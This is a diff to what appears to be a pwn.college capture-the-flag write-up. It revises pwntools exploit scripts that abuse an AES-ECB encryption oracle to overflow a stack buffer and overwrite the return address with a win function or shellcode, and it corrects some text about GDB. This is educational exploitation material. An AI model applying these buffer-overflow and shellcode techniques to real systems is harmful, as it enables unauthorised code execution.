@@ -416,6 +416,10 @@ win_addr = 0x4018f7
 buffer_addr = 0x7ffddabbe1f0
 addr_of_saved_ip = 0x7ffddabbe258
 
+# Calculate offset & number of padding blocks
+offset = addr_of_saved_ip - buffer_addr
+num_padding_blocks = offset // 16
+
 def get_encrypted_block(payload_bytes):
     """
     Interacts with the AES-ECB encryption oracle (dispatcher).
@@ -436,7 +440,7 @@ header_block = sample_cipher[0:16]
 # Block 2-7 - Padding chain
 padding_harvest = get_encrypted_block(b"B" * 16)
 padding_block = padding_harvest[16:32]  
-padding_blocks = padding_block * ((addr_of_saved_ip - buffer_addr) // 16)
+padding_blocks = padding_block * num_padding_blocks
 
 # Block 7 - Return address overwrite
 win_addr_block = b"C" * 8 
@@ -755,6 +759,7 @@ from pwn import *
 
 # Initialize values
 win_addr = 0x4013b6  
+num_padding_blocks = 7
 
 def get_encrypted_block(payload_bytes):
     """
@@ -776,7 +781,7 @@ header_block = sample_cipher[0:16]
 # Block 2-7 - Padding chain
 padding_harvest = get_encrypted_block(b"B" * 16)
 padding_block = padding_harvest[16:32]  
-padding_blocks = padding_block * 7
+padding_blocks = padding_block * num_padding_blocks
 
 # Block 7 - Return address overwrite
 win_addr_block = b"C" * 8 
@@ -1133,6 +1138,10 @@ buffer_addr = 0x7fffffffe570
 addr_of_saved_ip = 0x7fffffffe5c8 
 shellcode_addr = buffer_addr
 
+# Calculate offset & number of padding blocks
+offset = addr_of_saved_ip - buffer_addr
+num_padding_blocks = offset // 16
+
 def get_encrypted_block(payload_bytes):
     """
     Interacts with the AES-ECB encryption oracle (dispatcher).
@@ -1167,7 +1176,7 @@ shellcode_block = shellcode_cipher[16:32]
 # Block 2-6 - Padding chain
 padding_harvest = get_encrypted_block(b"B" * 16)
 padding_block = padding_harvest[16:32]
-padding_blocks = padding_block * ((addr_of_saved_ip - buffer_addr) // 16)
+padding_blocks = padding_block * (num_padding_blocks - 1)
 
 # Block 7 - Return address overwrite
 shellcode_addr_block = b"C" * 8 
@@ -1561,7 +1570,7 @@ End of assembler dump.
 The instruction at `challenge+652` calls the `EVP_DecryptUpdate@plt` with the arguments. One of those arguments is the location to which the plaintext will be read.
 We have to set a breakpoint there.
 
-The program wont unable to open the `.key` file because GDB drops permissions. Thus it will into error before ever reaching our breakpoint.
+If we run it within GDB, the program wont be able to open the `.key` file because GDB drops permissions. Thus it will into error before ever reaching our breakpoint.
 To combat this, we can invoke the program via pwntools and attach GDB to it. For this we will have to open practice mode.
 
 ```py title="~/script.py" showLineNumbers
@@ -1824,6 +1833,10 @@ buffer_addr = 0x7fffffffe570
 addr_of_saved_ip = 0x7fffffffe5c8 
 shellcode_addr = buffer_addr
 
+# Calculate offset & number of padding blocks
+offset = addr_of_saved_ip - buffer_addr
+num_padding_blocks = offset // 16
+
 def get_encrypted_block(payload_bytes):
     """
     Interacts with the AES-ECB encryption oracle (dispatcher).
@@ -1859,7 +1872,7 @@ shellcode_block = shellcode_cipher[16:32]
 padding_harvest = get_encrypted_block(b"B" * 16)
 padding_block = padding_harvest[16:32]
 # Since this time the buffer_addr signifies the address of plaintext, and not plaintext.mesage, we have to subtract 16 bytes (8 for plaintext.header, 8 for plaintext.length)
-padding_blocks = padding_block * ((addr_of_saved_ip - buffer_addr - 16) // 16)
+padding_blocks = padding_block * (num_padding_blocks - 1)
 
 # Block 7 - Return address overwrite
 shellcode_addr_block = b"C" * 8 
@@ -1898,6 +1911,7 @@ hacker@practice~integrated-security~ecb-to-shellcode-hard:~$ cat ~/Z
 pwn.college{practice}
 ```
 
+Great!
 The same script will work in the non-practice mode as the binary is non-PIE.
 
 ```
